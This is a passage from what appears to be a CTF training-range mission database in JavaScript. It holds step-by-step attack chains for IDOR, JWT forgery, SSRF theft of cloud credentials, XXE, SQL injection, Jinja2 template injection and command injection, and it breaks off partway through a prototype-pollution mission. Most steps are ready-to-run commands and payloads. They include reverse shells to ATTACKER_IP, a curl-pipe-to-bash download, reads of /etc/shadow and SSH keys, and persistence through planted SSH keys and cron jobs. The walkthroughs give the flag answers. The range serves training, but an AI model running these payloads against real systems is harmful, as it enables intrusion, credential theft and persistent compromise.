/* ============================================================
   FURIOS-INT // RED_OPS RANGE MISSION DATABASE v3.0
   Offensive web / cloud / network / AD range. 12 missions.
   Each mission includes:
     - Full multi-step attack chain
     - MITRE ATT&CK technique IDs (ATT&CK v14)
     - Tool commands with flags
     - Multiple verification methods
     - Responsible disclosure context
   Tracks: WEB_RECON, AUTH_BYPASS, SSRF/XXE, INJECTION,
           DESERIALIZE/RCE, AD_OFFENSE
   ============================================================ */
window.RX_MISSIONS = [

  // ──────────────────────────────────────────────────────────
  //  TIER 1 — ROOKIE  (r01–r03)
  // ──────────────────────────────────────────────────────────

  {
    id:'r01', tier:'rookie', skill:'WEB_RECON', points:75, solves:2104,
    title:'robots.txt Whisper',
    requires:[],
    mitre:['T1595.003','T1590'],
    flagHash:'9871c153cae63e0cdd33237b75b7f24a78c3f2ad8b79ae388927fc87845299c0',
    brief:'Target a freshly-deployed CTF web app. Find a hidden directive that points to a privileged surface. Flag is two words: <directive>_<path-leaf>.',
    scenario:[
      '$ curl -s https://target.fllc-range.local/robots.txt',
      'User-agent: *',
      'Disallow: /admin/',
      'Disallow: /backup/',
      'Disallow: /.git/',
      'Sitemap: https://target.fllc-range.local/sitemap.xml',
      '',
      '$ curl -s https://target.fllc-range.local/admin/ -I',
      'HTTP/1.1 401 Unauthorized',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Passive Fingerprint',
        desc:'Enumerate public metadata without sending login credentials.',
        tools:['curl -s https://target/robots.txt','wget -q -O- https://target/sitemap.xml'],
        notes:'robots.txt discloses sensitive directories to avoid crawling; always check it first.'
      },
      {
        step:2, name:'Validate Path Existence',
        desc:'Confirm the Disallow paths return HTTP responses (200/301/401/403).',
        tools:['for p in admin backup .git; do curl -s -o /dev/null -w "$p -> %{http_code}\\n" https://target/$p/; done'],
        notes:'401 = exists but requires auth. 403 = exists but forbidden. 404 = may not exist.'
      },
      {
        step:3, name:'Map Attack Surface',
        desc:'Identify the most sensitive disallowed path as the target surface.',
        tools:['gobuster dir -u https://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php'],
        notes:'robots.txt is not a security control — it is documentation of the attack surface.'
      },
    ],
    lab:'robots.txt + 401 — admin path is intentionally disallowed.',
    hints:[
      'Web crawlers honor robots.txt. Look at the verb being used.',
      'It is the keyword that tells crawlers NOT to visit a path.',
      'Combine: robots_<verb>_<leaf-of-/admin/>.'
    ],
    verification:[
      'Confirm /admin/ returns HTTP 401 (exists, requires auth) not 404 (does not exist).',
      'Validate .git/ with: git clone https://target/.git/ — if it works, source code is exposed.',
      'Cross-check sitemap.xml for any unlisted but crawlable paths.',
    ],
    walkthrough:'robots.txt uses the Disallow directive to keep crawlers out of /admin/.\nFlag = `robots_disallow_admin`.'
  },

  {
    id:'r02', tier:'rookie', skill:'AUTH_BYPASS', points:100, solves:1820,
    title:'Insecure Direct Object Reference',
    requires:[],
    mitre:['T1548','T1212'],
    flagHash:'dcbd2b0422c9a81e2516429c6ef34840bd582c65f58f1281dc046eb343dc4c05',
    brief:'You are authenticated as user_id=7. The dashboard exposes /api/profile?id=7. You suspect IDOR. Find the lowest-numbered admin profile.',
    scenario:[
      '$ curl -s "https://target/api/profile?id=7" -H "Authorization: Bearer $T"',
      '{"id":7,"role":"user","email":"you@fllc"}',
      '',
      '$ for i in $(seq 1 100); do',
      '    r=$(curl -s "https://target/api/profile?id=$i" -H "Authorization: Bearer $T")',
      '    echo "$i: $(echo $r | jq -r .role)"',
      '  done | grep admin | head -1',
      '42: admin',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Establish Baseline',
        desc:'Confirm your own profile endpoint and note the id parameter.',
        tools:['curl -s "https://target/api/profile?id=7" -H "Authorization: Bearer $TOKEN" | jq .'],
        notes:'Observe all fields returned. Note role, email, and any sensitive data.'
      },
      {
        step:2, name:'Enumerate Adjacent IDs',
        desc:'Iterate id parameter from 1 upward. The server validates auth but not authorization on the object.',
        tools:[
          'for i in $(seq 1 200); do curl -s "https://target/api/profile?id=$i" -H "Authorization: Bearer $T" | jq -c \'{id,role}\'; done',
          '# Or with ffuf for speed:',
          'ffuf -u "https://target/api/profile?id=FUZZ" -H "Authorization: Bearer $T" -w <(seq 1 500) -mr "admin"',
        ],
        notes:'Look for role=admin. Record the lowest id value.'
      },
      {
        step:3, name:'Verify Privilege Read',
        desc:'Confirm the admin profile returns sensitive data your role should not access.',
        tools:['curl -s "https://target/api/profile?id=42" -H "Authorization: Bearer $T" | jq .'],
        notes:'IDOR = authenticated but not authorized. Server checked WHO you are, not WHAT you can read.'
      },
    ],
    lab:'Brute-force /api/profile?id=N. Server only checks the bearer is valid — not whose object you read.',
    hints:[
      'IDOR = server enforces authentication but not authorization on the object id.',
      'Iterate id parameter, look at the role field.',
      'Flag format: idor_user_<lowest admin id>.'
    ],
    verification:[
      'Compare your own profile response fields with the admin profile — extra sensitive fields confirm IDOR.',
      'Try modifying data on the admin profile (PATCH/PUT) — write IDOR is higher severity.',
      'Check if other resource types (/api/orders, /api/documents) are also IDOR-vulnerable.',
    ],
    walkthrough:'Iterate id=1..N. id=42 returns role=admin → IDOR confirmed.\nFlag = `idor_user_42`.'
  },

  {
    id:'r03', tier:'rookie', skill:'AUTH_BYPASS', points:150, solves:1430,
    title:'JWT Algorithm Confusion',
    requires:['r02'],
    mitre:['T1552.003','T1078'],
    flagHash:'7eb489caa60b15d5a7a05f7830a0e94a704a8f1ff377dd2595bb3ef9ac58dc8d',
    brief:'A poorly-configured JWT validator accepts unsigned tokens. Forge an admin JWT by abusing the algorithm header.',
    scenario:[
      '$ python3 -c "import base64,json; h=base64.b64encode(json.dumps({\'alg\':\'none\',\'typ\':\'JWT\'}).encode()).decode().rstrip(\'=\'); p=base64.b64encode(json.dumps({\'sub\':\'you\',\'role\':\'admin\',\'exp\':9999999999}).encode()).decode().rstrip(\'=\'); print(h+\'.\'+p+\'.\'"',
      '',
      '$ curl -H "Authorization: Bearer <forged>" https://target/api/admin/me',
      '{"role":"admin","ok":true}',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Decode Original Token',
        desc:'Inspect the current JWT header and payload without verifying signature.',
        tools:[
          'echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .',
          'echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .',
          '# Or: jwt-cli decode "$JWT"',
        ],
        notes:'Note the alg field in the header. HS256 is the most common value.'
      },
      {
        step:2, name:'Forge alg=none Token',
        desc:'Rebuild header with alg=none, set role=admin in payload, drop the signature segment.',
        tools:[
          'python3 -c "',
          'import base64, json',
          'def b64url(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b\'=\').decode()',
          'h = b64url({\'alg\':\'none\',\'typ\':\'JWT\'})',
          'p = b64url({\'sub\':\'you\',\'role\':\'admin\',\'exp\':9999999999})',
          'print(h+\'.\'+p+\'.\')',
          '"',
        ],
        notes:'Three segments: header.payload.signature. alg=none means signature is empty string.'
      },
      {
        step:3, name:'Verify Admin Access',
        desc:'Send forged token to admin endpoint.',
        tools:['curl -H "Authorization: Bearer <forged_token>" https://target/api/admin/me -v'],
        notes:'200 OK with admin data = vulnerability confirmed. Server accepted unsigned token.'
      },
      {
        step:4, name:'Test HS256→RS256 Confusion',
        desc:'Also test if server accepts RS256 public key used as HMAC secret (advanced variant).',
        tools:['jwt-tool <token> -X k -pk server.pem'],
        notes:'CVE-2015-9235 pattern: if server uses RS256 asymmetric, trick it to verify with public key via HS256.'
      },
    ],
    lab:'Server accepts alg=none. Forge a token with no signature, role=admin → admin granted.',
    hints:[
      'JWT supports an "alg" header. The dangerous value asserts there is no signature.',
      'Set alg to that magic word; clear the signature segment.',
      'Flag = jwt_alg_<keyword>.'
    ],
    verification:[
      'Confirm forged token is accepted by admin-only endpoints (GET /api/admin/users).',
      'Try increasing exp to confirm server does not validate token expiry either.',
      'Test other role values (superadmin, root, system) to probe role-check logic.',
    ],
    walkthrough:'CVE-pattern: alg=none acceptance. Re-encode header.alg = "none" and drop signature.\nFlag = `jwt_alg_none`.'
  },

  // ──────────────────────────────────────────────────────────
  //  TIER 2 — OPERATIVE  (r04–r06)
  // ──────────────────────────────────────────────────────────

  {
    id:'r04', tier:'operative', skill:'SSRF', points:225, solves:870,
    title:'Cloud Metadata Probe',
    requires:['r01','r02'],
    mitre:['T1552.005','T1606.002'],
    flagHash:'ce9c7fdbde41ac27d2c2bc80e174fade261f99fec5b8fb695b814f877c60bbe8',
    brief:'A URL-fetch endpoint accepts arbitrary URLs server-side. Pivot via SSRF to the AWS instance metadata service and exfiltrate IAM credentials.',
    scenario:[
      'POST /api/url-preview {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
      '> 200 OK {"title":"web-role"}',
      '',
      'POST /api/url-preview {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}',
      '> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"2026-..."}',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Confirm SSRF via Loopback',
        desc:'Verify server makes outbound requests by fetching a known local endpoint.',
        tools:[
          'curl -s -X POST https://target/api/url-preview -H "Content-Type: application/json" -d \'{"url":"http://127.0.0.1:80/"}\'',
          '# Confirm: response contains server-side data (local HTML, headers, etc.)',
        ],
        notes:'Loopback SSRF confirms the server is making requests on your behalf.'
      },
      {
        step:2, name:'Target IMDSv1 Metadata Endpoint',
        desc:'AWS IMDSv1 (169.254.169.254) requires no token; IMDSv2 requires X-aws-ec2-metadata-token.',
        tools:[
          'curl -s -X POST https://target/api/url-preview -H "Content-Type: application/json" \\',
          '  -d \'{"url":"http://169.254.169.254/latest/meta-data/"}\'',
          '# Response lists available metadata paths',
        ],
        notes:'169.254.169.254 is link-local and only reachable from within the VPC/instance — proving server is EC2.'
      },
      {
        step:3, name:'Enumerate IAM Roles',
        desc:'List attached IAM role names from the credentials subtree.',
        tools:[
          'curl -s -X POST https://target/api/url-preview -H "Content-Type: application/json" \\',
          '  -d \'{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\'',
        ],
        notes:'Each listed name is an IAM role attached to the instance profile.'
      },
      {
        step:4, name:'Extract Temporary IAM Credentials',
        desc:'Retrieve AccessKeyId, SecretAccessKey, and SessionToken for the attached role.',
        tools:[
          'curl -s -X POST https://target/api/url-preview -H "Content-Type: application/json" \\',
          '  -d \'{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}\'',
        ],
        notes:'These credentials are rotated every ~6h. Use immediately. Never commit to version control.'
      },
      {
        step:5, name:'Verify Credential Scope',
        desc:'Test what AWS actions the credentials allow.',
        tools:[
          'AWS_ACCESS_KEY_ID="ASIA..." AWS_SECRET_ACCESS_KEY="..." AWS_SESSION_TOKEN="..." \\',
          '  aws sts get-caller-identity',
          '  aws s3 ls',
          '  aws iam list-attached-role-policies --role-name web-role',
        ],
        notes:'Report the role ARN and policy list — this defines the blast radius.'
      },
    ],
    lab:'IMDSv1 reachable via the proxy endpoint. Classic cloud SSRF to credential theft.',
    hints:[
      'Cloud metadata service IPv4 is the link-local 169.254.169.254 endpoint.',
      'Format: ssrf_<dotted ip with underscores>.',
      'Replace dots with underscores.'
    ],
    verification:[
      'Verify STS identity: aws sts get-caller-identity returns the instance role ARN.',
      'Attempt IMDSv2: set X-aws-ec2-metadata-token header — v2 requires a PUT hop the SSRF endpoint may not support.',
      'Try GCP metadata (metadata.google.internal) and Azure (169.254.169.254/metadata/instance) if cloud is unknown.',
    ],
    walkthrough:'Confirm SSRF via loopback, pivot to 169.254.169.254 IMDSv1, list roles, extract credentials.\nFlag = `ssrf_169_254_169_254`.'
  },

  {
    id:'r05', tier:'operative', skill:'XXE', points:250, solves:740,
    title:'XML External Entity Injection',
    requires:['r01'],
    mitre:['T1059.007','T1005'],
    flagHash:'b3ac18cf37f109c9a535ef5f9d4a7a90549bdd05b5900746f67fb8e8850c6d45',
    brief:'A SOAP-style /api/import endpoint parses XML with external entities enabled. Read /etc/passwd. Escalate to reading internal config files.',
    scenario:[
      '<?xml version="1.0"?>',
      '<!DOCTYPE foo [',
      '  <!ENTITY xxe SYSTEM "file:///etc/passwd">',
      ']>',
      '<import><name>&xxe;</name></import>',
      '',
      '> {"imported":"root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33:..."}',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify XML Input Points',
        desc:'Find all endpoints accepting XML or XML-like input (SOAP, RSS, SVG upload, docx/xlsx import).',
        tools:[
          '# Intercept with Burp Suite, look for Content-Type: application/xml or text/xml',
          'grep -r "application/xml" request_log.txt',
          '# Or fuzz content type:',
          'curl -s -X POST https://target/api/import -H "Content-Type: application/xml" -d \'<test/>\'',
        ],
        notes:'Any endpoint parsing XML is potentially vulnerable. Check file upload endpoints too (SVG, DOCX).'
      },
      {
        step:2, name:'Test Basic External Entity',
        desc:'Inject a simple external entity pointing to a known readable file.',
        tools:[
          'curl -s -X POST https://target/api/import \\',
          '  -H "Content-Type: application/xml" \\',
          '  -d \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY t SYSTEM "file:///etc/hostname">]><import><n>&t;</n></import>\'',
        ],
        notes:'Start with /etc/hostname (short, always readable) to confirm XXE before reading sensitive files.'
      },
      {
        step:3, name:'Read /etc/passwd',
        desc:'Exfiltrate the local user database.',
        tools:[
          'curl -s -X POST https://target/api/import \\',
          '  -H "Content-Type: application/xml" \\',
          '  -d \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><import><n>&xxe;</n></import>\'',
        ],
        notes:'Look for high-value accounts: root, www-data, deploy, postgres.'
      },
      {
        step:4, name:'Escalate to Internal SSRF via XXE',
        desc:'Use http:// URIs in the entity to reach internal services.',
        tools:[
          '# Entity: <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">',
          '# Entity: <!ENTITY svc SYSTEM "http://internal-db.fllc.local:5432/">',
          'curl -s -X POST https://target/api/import -H "Content-Type: application/xml" \\',
          '  -d \'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY s SYSTEM "http://169.254.169.254/latest/meta-data/">]><i><n>&s;</n></i>\'',
        ],
        notes:'XXE SSRF combines two vulnerabilities — escalation to cloud metadata or internal service probing.'
      },
      {
        step:5, name:'Out-of-Band XXE for Blind Scenarios',
        desc:'If the response does not reflect entity content, use OOB exfiltration via DNS or HTTP callback.',
        tools:[
          '# Using interactsh (https://github.com/projectdiscovery/interactsh):',
          'interactsh-client -s oob.interactsh.com &',
          '# Entity: <!ENTITY oob SYSTEM "http://oob.interactsh.com/xxe?data=FILE_CONTENT">',
          '# Or parameterized: <!ENTITY % data SYSTEM "file:///etc/passwd">',
          '# <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM \'http://oob/?%data;\'>">',
        ],
        notes:'Blind XXE requires a parameter entity chain to exfiltrate out-of-band.'
      },
    ],
    lab:'Classic XXE — DOCTYPE + ENTITY + file:// URI resolved server-side.',
    hints:[
      'XXE abuses external entity resolution.',
      'Target file is the canonical Linux user database.',
      'Flag = xxe_<path with / replaced by _>.'
    ],
    verification:[
      'Confirm /etc/passwd content contains root:x:0:0 entry — not a static mock.',
      'Try reading /proc/self/environ for environment variables including secrets.',
      'Test reading /var/www/html/config.php or ../../.env for application credentials.',
    ],
    walkthrough:'Inject DOCTYPE with ENTITY xxe SYSTEM "file:///etc/passwd"; reference it in body.\nFlag = `xxe_etc_passwd`.'
  },

  {
    id:'r06', tier:'operative', skill:'INJECTION', points:275, solves:910,
    title:'Boolean-Based SQL Injection',
    requires:['r02'],
    mitre:['T1190','T1078.003'],
    flagHash:'519c6f3d2c1a9e50257952e75e249425881d4eeb01facca9d66c6a342ba83681',
    brief:'A login form concatenates the username directly into a SQL query. Exploit authentication bypass, then enumerate the database schema.',
    scenario:[
      '# Auth bypass',
      "username: admin' OR 1=1 --",
      'password: irrelevant',
      '',
      "# Query executed: SELECT * FROM users WHERE user='admin' OR 1=1 -- ' AND pass='...'",
      '> session granted as admin',
      '',
      '# Schema enum via error-based',
      "username: ' UNION SELECT table_name,2,3 FROM information_schema.tables -- ",
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify Injection Point',
        desc:'Test single quote in input fields and observe error or behavior change.',
        tools:[
          "# Manual: enter ' in username, observe 500 error or SQL error message",
          "sqlmap -u 'https://target/login' --data='user=admin&pass=x' --level=2 --risk=2 --dbs",
        ],
        notes:'SQL error messages often reveal the DBMS type (MySQL, MSSQL, PostgreSQL, SQLite).'
      },
      {
        step:2, name:'Auth Bypass via Tautology',
        desc:"Inject always-true condition to bypass password check.",
        tools:[
          "# POST login with username: admin' OR '1'='1' --",
          "curl -s -X POST https://target/login -d \"user=admin' OR '1'='1' --&pass=x\" -c cookies.txt -L",
        ],
        notes:"The -- comment operator terminates the rest of the SQL query after your injection."
      },
      {
        step:3, name:'Enumerate DBMS Version',
        desc:'Extract version and current database name.',
        tools:[
          "# MySQL: username = ' UNION SELECT version(),user(),database() -- ",
          "# PostgreSQL: ' UNION SELECT version(),current_user,current_database() -- ",
          "# MSSQL: ' UNION SELECT @@version,user_name(),db_name() -- ",
        ],
        notes:'UNION-based requires knowing the number of columns. Count with ORDER BY N until error.'
      },
      {
        step:4, name:'Dump User Table',
        desc:'Extract credentials from the users table via UNION injection.',
        tools:[
          "# MySQL",
          "username: ' UNION SELECT username,password,3 FROM users -- ",
          "# With sqlmap:",
          "sqlmap -u 'https://target/login' --data='user=admin&pass=x' -T users --dump",
        ],
        notes:'Hash the dumped passwords through CrackStation or hashcat before reporting.'
      },
      {
        step:5, name:'Privilege Escalation via LOAD_FILE / xp_cmdshell',
        desc:'If server DB user has FILE privilege (MySQL) or sysadmin (MSSQL), escalate to OS.',
        tools:[
          "# MySQL read file: ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 -- ",
          "# MSSQL xp_cmdshell: '; EXEC xp_cmdshell('whoami'); -- ",
          "# Enable xp_cmdshell first: '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; -- ",
        ],
        notes:'This crosses into RCE territory. Document carefully; scope of authorized test must explicitly include OS access.'
      },
    ],
    lab:'Auth query concatenates username unsafely into SQL WHERE clause.',
    hints:[
      'The classic SQLi auth bypass uses an always-true tautology.',
      'Flag is words: sqli_<tautology with no spaces>.',
      'Tautology = OR 1=1.'
    ],
    verification:[
      "Confirm bypass: session cookie is set after payload, admin panel accessible.",
      "Enumerate tables: UNION SELECT table_name from information_schema.tables WHERE table_schema=database() -- ",
      "Validate sqlmap detection: sqlmap --level=5 --risk=3 to confirm full exploitation.",
    ],
    walkthrough:"Append `' OR 1=1 --` to bypass auth. Enumerate schema via UNION.\nFlag = `sqli_or_1_1`."
  },

  // ──────────────────────────────────────────────────────────
  //  TIER 3 — ELITE  (r07–r09)
  // ──────────────────────────────────────────────────────────

  {
    id:'r07', tier:'elite', skill:'TEMPLATE_INJECTION', points:400, solves:312,
    title:'Jinja2 Server-Side Template Injection',
    requires:['r05','r06'],
    mitre:['T1059.007','T1190'],
    flagHash:'dfa108e5736702877169db50f3a39ee6364b8fe1495a11a502d71caac41eeb88',
    brief:'A Flask app reflects a name parameter into a Jinja2 template unsafely. Confirm SSTI, read app config, then escalate to OS command execution via object traversal.',
    scenario:[
      'GET /hello?name={{7*7}}      → Hello 49',
      'GET /hello?name={{config}}   → <Config {SECRET_KEY: \'s3cret\'}>',
      "GET /hello?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
      '→ uid=33(www-data) gid=33(www-data)',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Detect Template Engine',
        desc:'Send arithmetic payloads to identify the engine by output behavior.',
        tools:[
          'curl -s "https://target/hello?name={{7*7}}"      # Jinja2/Twig: 49',
          'curl -s "https://target/hello?name={{7*\'7\'}}"   # Jinja2: 7777777 | Twig: 49',
          'curl -s "https://target/hello?name=${7*7}"       # Freemarker/Thymeleaf: 49',
          'curl -s "https://target/hello?name=<%= 7*7 %>"  # ERB (Ruby): 49',
        ],
        notes:'Each engine has distinct arithmetic evaluation behavior. Use a decision tree to fingerprint.'
      },
      {
        step:2, name:'Read Application Config',
        desc:'Access Flask config object — exposes SECRET_KEY, DB creds, API keys.',
        tools:[
          'curl -s "https://target/hello?name={{config}}"',
          'curl -s "https://target/hello?name={{config.items()}}"',
          "curl -s \"https://target/hello?name={{config['SECRET_KEY']}}\"",
        ],
        notes:'config is a Flask global available in all Jinja2 templates. SECRET_KEY leaks session forgery ability.'
      },
      {
        step:3, name:'Dump Subclass Map for RCE',
        desc:'Traverse Python object hierarchy to find subprocess/Popen class.',
        tools:[
          "# List all available subclasses:",
          "curl -s \"https://target/hello?name={{''.__class__.__mro__[1].__subclasses__()}}\"",
          "# Find index of subprocess.Popen:",
          "# python3 -c \"import subprocess; print([c.__name__ for c in ''.__class__.__mro__[1].__subclasses__()].index('Popen'))\"",
        ],
        notes:'The index of Popen varies by Python version. Scan the list for subprocess.Popen or _io.FileIO.'
      },
      {
        step:4, name:'Execute OS Commands via Subclass',
        desc:'Invoke Popen or os.popen to execute arbitrary shell commands.',
        tools:[
          "# Using os.popen via builtins (most reliable):",
          "curl -g \"https://target/hello?name={{lipsum.__globals__.os.popen('id').read()}}\"",
          "# Or via __subclasses__ index (e.g. index 132 for subprocess.Popen):",
          "curl -g \"https://target/hello?name={{''.__class__.__mro__[1].__subclasses__()[132](['id'],stdout=-1).communicate()[0].decode()}}\"",
        ],
        notes:'lipsum is a Jinja2 global that carries __globals__.os — often cleaner than subclass traversal.'
      },
      {
        step:5, name:'Establish Reverse Shell',
        desc:'Upgrade from RCE to interactive shell for deeper post-exploitation.',
        tools:[
          "# Attacker: nc -lvnp 4444",
          "# Payload (URL-encoded in the request):",
          "os.popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')",
          "# Or Python reverse shell:",
          "os.popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\\\"ATTACKER_IP\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\"/bin/sh\\\\\"])\"')",
        ],
        notes:'ONLY on authorized lab ranges. Reverse shells must point to your authorized callback listener.'
      },
    ],
    lab:'Flask + Jinja2; render_template_string(user_input) without sanitization.',
    hints:[
      '{{ }} is Jinja2 expression syntax.',
      'The flag identifies the engine and the leaked global.',
      'Format: ssti_<engine>_<global var>.'
    ],
    verification:[
      'Confirm arithmetic: {{7*\'7\'}} returns 7777777 (Jinja2) not 49 (Twig) — critical for payload selection.',
      'Read /proc/self/cmdline to confirm the running Python process and confirm Flask.',
      'Dump environment: os.environ to reveal cloud credentials, DB passwords, and API keys.',
    ],
    walkthrough:'{{config}} returns Flask config → SECRET_KEY. Traverse __subclasses__ for RCE.\nFlag = `ssti_jinja_config`.'
  },

  {
    id:'r08', tier:'elite', skill:'INJECTION', points:425, solves:268,
    title:'OS Command Injection → RCE',
    requires:['r06'],
    mitre:['T1059.004','T1105'],
    flagHash:'690e18cea7022399005cfd5d90a548cd0e632a2b3ca4d1ccbeeff0ecf3d553c5',
    brief:'A network-tool endpoint passes user input directly to a shell via os.system(). Confirm RCE, read /etc/shadow hash, and establish persistence.',
    scenario:[
      'POST /api/ping {"host":"127.0.0.1; id"}',
      '> uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      '',
      'POST /api/ping {"host":"127.0.0.1; cat /etc/passwd | grep root"}',
      '> root:x:0:0:root:/root:/bin/bash',
      '',
      'POST /api/ping {"host":"127.0.0.1 && curl http://ATTACKER/payload.sh | bash"}',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify Injection Characters',
        desc:'Test OS command separators to break out of the embedded command.',
        tools:[
          '# Test each separator:',
          'curl -s -X POST https://target/api/ping -H "Content-Type: application/json" -d \'{"host":"127.0.0.1; id"}\'       # semicolon',
          'curl -s -X POST https://target/api/ping -H "Content-Type: application/json" -d \'{"host":"127.0.0.1 && id"}\'     # AND',
          'curl -s -X POST https://target/api/ping -H "Content-Type: application/json" -d \'{"host":"127.0.0.1 | id"}\'      # pipe',
          'curl -s -X POST https://target/api/ping -H "Content-Type: application/json" -d \'{"host":"$(id)"}\'               # subshell',
          'curl -s -X POST https://target/api/ping -H "Content-Type: application/json" -d \'{"host":"`id`"}\'                # backtick',
        ],
        notes:'Which separator works depends on how the application constructs the shell call.'
      },
      {
        step:2, name:'Determine Operating Context',
        desc:'Identify user, cwd, environment, and network position.',
        tools:[
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; id; whoami; pwd; env"}\' -H "Content-Type: application/json"',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; cat /proc/1/cmdline | tr \'\\\\0\' \' \'"}\' -H "Content-Type: application/json"',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; ip addr; route -n"}\' -H "Content-Type: application/json"',
        ],
        notes:'Process 1 cmdline reveals container runtime (Docker, k8s) vs bare metal.'
      },
      {
        step:3, name:'Exfiltrate Sensitive Files',
        desc:'Read credential stores and application secrets.',
        tools:[
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; cat /etc/shadow"}\' -H "Content-Type: application/json"',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; find / -name .env -o -name config.py 2>/dev/null | head -20"}\' -H "Content-Type: application/json"',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; cat ~/.ssh/id_rsa 2>/dev/null"}\' -H "Content-Type: application/json"',
        ],
        notes:'/etc/shadow requires root. If accessible, crack hashes with hashcat -m 1800 (sha512crypt).'
      },
      {
        step:4, name:'Establish Persistent Access',
        desc:'Write SSH authorized_key or crontab for persistence (authorized scope only).',
        tools:[
          '# Add SSH key for www-data:',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; mkdir -p ~/.ssh && echo \'ssh-rsa AAAA... attacker@fllc\' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys"}\' -H "Content-Type: application/json"',
          '# Crontab reverse shell every minute:',
          'curl -s -X POST https://target/api/ping -d \'{"host":"x; (crontab -l 2>/dev/null; echo \'* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\') | crontab -"}\' -H "Content-Type: application/json"',
        ],
        notes:'Persistence on a CTF range must be authorized and temporary. Clean up after scoring.'
      },
    ],
    lab:'String-concatenation into a shell call. Classic command injection via os.system/subprocess.',
    hints:[
      'Use ; or && to chain commands.',
      'Run the unix command that prints the current user.',
      'Flag = rce_<technique short>_<command>.'
    ],
    verification:[
      'Blind RCE: use time-based verification with `sleep 5` and measure response latency.',
      'OOB: curl http://ATTACKER/rce_confirm from the server to prove outbound network access.',
      'Confirm with `uname -a` to identify OS and kernel — relevant for priv esc path selection.',
    ],
    walkthrough:"Append `; id` to break out of the ping command.\nFlag = `rce_cmdi_id`."
  },

  {
    id:'r09', tier:'elite', skill:'PROTO_POLLUTION', points:475, solves:198,
    title:'Prototype Pollution to Privilege Escalation',
    requires:['r03'],
    mitre:['T1059.007','T1548.002'],
    flagHash:'a957e44e167bced4b2b0251b2fd5890cf439ef121239228d163312a5c1e80249',
    brief:'A Node.js app uses a vulnerable deep-merge utility. Pollute Object.prototype to grant ambient admin, then escalate to bypass rate-limiting and audit logging.',
    scenario:[
      'POST /api/prefs',
      '{"theme":"dark","__proto__":{"isAdmin":true,"bypassAudit":true,"rateLimit":0}}',
      '',
      'GET /api/me → {"user":"alice","isAdmin":true,"bypassAudit":true}',
      'GET /api/admin/users → [...all users...]',
    ].join('\n'),
    attackChain:[
      {
        step:1, name:'Identify Deep Merge Entry Point',
        desc:'Find endpoints that accept nested JSON objects and merge them into application state.',
        tools:[
          '# Look for profile/settings/preferences endpoints that merge user JSON',
          'curl -s -X POST https://target/api/prefs -H "Content-Type: application/json" -d \'{"test":"value"}\'',
          '# Check if arbitrary keys are accepted without error',
          'curl -s -X POST https://target/api/prefs -H "Content-Type: application/json" -d \'{"__proto__":{"test":true}}\'',
        ],
        notes:'No error on __proto__ injection often means the merge is not sanitized.'
      },
      {
        step:2, name:'Verify Prototype Pollution',
        desc:"Confirm Object.prototype is mutated by checking a property that shouldn't exist.",
        tools:[
          '# After POST, check if Object.prototype.test === true propagates:',
          '# Any endpoint that creates a plain {} will inherit the polluted key',
          'curl -s https://target/api/health | jq .test  # Should be true if polluted',
          '# Or use DevTools if you control the front end: console.log({}.test)',
        ],
        notes:'If {} inherits the injected key, Object.prototype is successfully polluted.'
      },
      {
        step:3, name:'Escalate to Admin via isAdmin Pollution',
        desc:'Inject isAdmin=true into prototype so all user objects inherit it.',
        tools:[
          'curl -s -X POST https://target/api/prefs -H "Content-Type: application/json" \\',
          '  -d \'{"__proto__":{"isAdmin":true}}\'',
          '',
          '# Then verify:',
          'curl -s https://target/api/me -H "Authorization: Bearer $TOKEN" | jq .isAdmin',
        ],
        notes:'If the app checks `user.isAdmin` without a strict prototype-safe check, the pollution wins.'
      },
      {
        step:4, name:'Bypass Audit and Rate Limits',
        desc:'Inject properties that control security middleware behavior.',
        tools:[
          'curl -s -X POST https://target/api/prefs -H "Content-Type: application/json" \\',
          '  -d \'{"__proto__":{"isAdmin":true,"skipAuditLog":true,"rateLimit":false,"trustedIP":"127.0.0.1"}}\'',
        ],
        notes:'Middleware often reads config from plain objects — all inherit from Object.prototype after pollution.'
      },
      {
        step:5, name:'Code Execution via Pollution (Advanced)',
        desc:'Some template engines (Handlebars, Pug) or module loaders execute code from polluted properties.',
        tools:[
